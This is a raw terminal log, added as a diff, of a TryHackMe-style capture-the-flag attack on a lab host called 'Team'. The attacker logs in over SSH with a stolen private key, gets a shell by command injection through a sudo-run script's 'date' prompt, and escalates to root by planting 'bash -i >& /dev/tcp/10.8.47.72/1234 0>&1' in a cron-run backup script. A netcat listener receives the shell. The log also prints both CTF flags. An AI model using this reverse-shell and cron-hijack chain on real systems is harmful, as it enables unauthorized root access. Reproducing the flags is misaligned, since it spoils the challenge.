@@ -1,0 +1,94 @@
+root@kali:~/Scaricati/team# vim id_rsa
+root@kali:~/Scaricati/team# 
+root@kali:~/Scaricati/team# 
+root@kali:~/Scaricati/team# chmod 600 id_rsa 
+root@kali:~/Scaricati/team# 
+root@kali:~/Scaricati/team# 
+root@kali:~/Scaricati/team# ssh dale@10.10.103.64 -i id_rsa 
+The authenticity of host '10.10.103.64 (10.10.103.64)' can't be established.
+ECDSA key fingerprint is SHA256:ZRMtjzCdqnyFAT2ug0dcgZw7i0oWlFbXQVkB4Krm3os.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes                                                                                                                                                                   
+Warning: Permanently added '10.10.103.64' (ECDSA) to the list of known hosts.                                                                                                                                                              
+Last login: Mon Jan 18 10:51:32 2021                                                                                                                                                                                                       
+dale@TEAM:~$                                                                                                                                                                                                                               
+dale@TEAM:~$                                                                                                                                                                                                                               
+dale@TEAM:~$ ls                                                                                                                                                                                                                            
+user.txt                                                                                                                                                                                                                                   
+dale@TEAM:~$ cat user.txt                                                                                                                                                                                                                  
+THM{6Y0TXHz7c2d}                                                                                                                                                                                                                           
+dale@TEAM:~$ 
+
+
+dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: gyles
+Enter 'date' to timestamp the file: /bin/bash
+The Date is 
+
+ls
+admin_checks
+whoami
+gyles
+
+python3 -c “import pty;pty.spawn(‘/bin/bash’)”
+Stats have been backed up
+dale@TEAM:/home/gyles$ 
+
+dale@TEAM:/home/gyles$ sudo -u gyles /home/gyles/admin_checks
+Reading stats.
+Reading stats..
+Enter name of person backing up the data: gyles
+Enter 'date' to timestamp the file: /bin/bash
+The Date is 
+python3 "import pty;pty.spawn('/bin/bash')"
+
+ls
+admin_checks
+whoami
+gyles
+python3 "import pty;pty.spawn('/bin/bash')"
+
+ls
+admin_checks
+
+
+cd /opt/admin_stuff
+ls
+script.sh
+cat script.sh
+#!/bin/bash
+#I have set a cronjob to run this script every minute
+
+
+dev_site="/usr/local/sbin/dev_backup.sh"
+main_site="/usr/local/bin/main_backup.sh"
+#Back ups the sites locally
+$main_site
+$dev_site
+
+
+vim /usr/local/bin/main_backup.sh
+cat /usr/local/bin/main_backup.sh
+#!/bin/bash
+bash -i >& /dev/tcp/10.8.47.72/1234 0>&1
+#cp -r /var/www/team.thm/* /var/backups/www/team.thm/
+
+root@kali:~/Scaricati/team# nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.8.47.72] from (UNKNOWN) [10.10.103.64] 38804
+bash: cannot set terminal process group (1369): Inappropriate ioctl for device
+bash: no job control in this shell
+root@TEAM:~# id
+id
+uid=0(root) gid=0(root) groups=0(root),1004(admin)
+root@TEAM:~# ls
+ls
+root.txt
+root@TEAM:~# cat root.txt
+cat root.txt
+THM{fhqbznavfonq}
+root@TEAM:~# 
+
+
+
